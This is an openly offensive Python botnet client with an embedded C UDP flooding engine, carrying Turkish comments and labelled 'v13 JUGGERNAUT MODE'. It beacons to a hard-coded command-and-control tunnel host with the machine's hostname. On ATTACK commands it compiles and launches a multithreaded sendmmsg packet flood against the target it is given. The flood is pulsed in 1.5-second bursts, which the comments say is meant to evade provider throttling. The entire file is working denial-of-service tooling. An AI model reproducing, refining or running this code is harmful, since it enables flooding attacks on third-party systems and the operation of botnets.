#!/usr/bin/env python3
"""
  ENI & LO — v13 JUGGERNAUT MODE (2026)
  =====================================
  - SO_REUSEPORT: Bütün thread'ler tamamen aynı UDP portunu ortak kullanır.
  - Zero-Overhead: Non-blocking yerine Blocking kullanıldı. (CPU %100 kernel moduna girer).
  - Vurma Evresi (Spike): Sadece 1.5 saniye aralıksız kernel'e kitlenir, ardından 13.5 saniye tam sessizlik yapar.
  - Bypass Oracle Throttling: En kısa sürede en yoğun paketi basar.
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, os, subprocess, signal

DEFAULT_C2   = "marilyn-superior-bunny-possess.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  v13 JUGGERNAUT C-ENGINE
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#define BATCH 2048
#define PKTSIZE 1472

static volatile int g_run = 1;
static char g_ip[64];
static int g_port;

void on_sig(int s) { g_run = 0; }

void* juggernaut_thread(void* arg) {
    int tid = *(int*)arg;
    free(arg);

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;
    
    // SO_REUSEPORT allows multiple threads to bind to the same port/socket core efficiently
    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    int buf = 16 * 1024 * 1024; 
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    char payload[PKTSIZE];
    memset(payload, 'J', PKTSIZE); 

    struct iovec iov[BATCH];
    struct mmsghdr msg[BATCH];
    
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base = payload;
        iov[i].iov_len = PKTSIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name = &dst;
        msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov = &iov[i];
        msg[i].msg_hdr.msg_iovlen = 1;
    }

    while (g_run) {
        struct timespec ts;
        clock_gettime(CLOCK_REALTIME, &ts);
        
        // 15 saniyelik senkron döngü
        int cycle_sec = ts.tv_sec % 15;
        
        // Sadece 0. saniyeden 1. saniyenin yarısına kadar (1.5 saniye) vurur
        if (cycle_sec == 0 || (cycle_sec == 1 && ts.tv_nsec < 500000000)) {
            // Kernel'e ölümüne Blocking sendmmsg. Hatasız kitlenir.
            sendmmsg(fd, msg, BATCH, 0);
        } else {
            // Tam sessizlik
            usleep(100000); 
        }
    }
    
    close(fd);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    
    signal(SIGTERM, on_sig); 
    signal(SIGINT, on_sig);

    pthread_t thr[128];
    for (int i = 0; i < threads; i++) {
        int* id = malloc(sizeof(int));
        *id = i;
        pthread_create(&thr[i], NULL, juggernaut_thread, id);
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(thr[i], NULL);
    }
    
    return 0;
}
"""

def compile_engine(cwd):
    if platform.system() != "Linux": return None
    binpath = os.path.join(cwd, "juggernaut_engine")
    srcpath = os.path.join(cwd, "juggernaut_engine.c")
    with open(srcpath, "w") as f: f.write(C_ENGINE)
    subprocess.run(["gcc","-O3","-march=native","-funroll-loops",srcpath,"-o",binpath,"-lpthread"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chmod(binpath, 0o755)
    return binpath

def bot_process(wid, c2h, c2p, workdir):
    bid = f"BOT-{platform.node()}-{wid}-{random.randint(1000,9999)}"
    proto = "https" if c2p == 443 else "http"
    poll = f"{proto}://{c2h}/poll"

    engine_bin = compile_engine(workdir)
    engine_proc = None
    last_aid = None
    
    print(f"\033[93m[JUGGERNAUT-{wid:02d}] Preparing 1.5s spike protocol...\033[0m")

    while True:
        try:
            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux JUGGERNAUT"}).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                cmd = json.loads(resp.read().decode())
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid != last_aid:
                    if engine_proc: 
                        try: engine_proc.kill() 
                        except: pass
                    
                    target = cmd.get("target")
                    port = int(cmd.get("port", 80))
                    threads = 16 # Her processe 16 thread (Toplam 32*16 = 512 Thread!)
                    
                    print(f"\033[91m[!] JUGGERNAUT-{wid:02d} SYNCED! 1.5s OBLITERATION AT {target}:{port} !!\033[0m")
                    engine_proc = subprocess.Popen([engine_bin, target, str(port), str(threads)])
                    last_aid = aid
                    
                elif act in ("STOP", "IDLE"):
                    if engine_proc:
                        try: engine_proc.kill()
                        except: pass
                        engine_proc = None
                        last_aid = None
                        print(f"\033[92m[JUGGERNAUT-{wid:02d}] Holding fire.\033[0m")
        except:
            pass
        time.sleep(0.5 + random.uniform(0, 0.5))

def main():
    print(f"\033[91m  ☢  ENI & LO — v13 JUGGERNAUT MODE  ☢\033[0m\n")
    host = DEFAULT_C2
    port = DEFAULT_PORT
    if len(sys.argv) > 1: host = sys.argv[1]
    
    workdir = os.getcwd()
    compile_engine(workdir)
    
    procs = []
    # 32 processes
    count = CPU_CORES if CPU_CORES > 0 else 32
    for i in range(count):
        p = multiprocessing.Process(target=bot_process, args=(i+1, host, port, workdir), daemon=True)
        p.start()
        procs.append(p)
        time.sleep(0.05)
        
    try:
        while True: time.sleep(60)
    except:
        for p in procs: p.kill()

if __name__ == "__main__":
    main()
